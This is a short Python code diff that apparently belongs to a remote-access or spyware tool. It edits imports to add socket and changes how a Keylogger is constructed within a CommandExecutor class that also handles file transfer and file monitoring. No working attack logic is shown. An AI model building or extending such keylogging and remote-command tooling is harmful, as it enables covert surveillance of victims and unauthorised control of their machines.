@@ -1,5 +1,5 @@
 import helpers
-import os, subprocess
+import socket, os, sys, time, subprocess
 from fileUtils import FileTransfer, FileMonitor
 from keylog import Keylogger
 
@@ -8,7 +8,7 @@ class CommandExecutor(object):
         self.savedFile = "result.txt"
 
         self.fileTransfer = FileTransfer()
-        self.keylogger = Keylogger(self.fileTransfer)
+        self.keylogger = Keylogger()
         self.fileMonitor = FileMonitor()
 
     def execute(self, cmd):
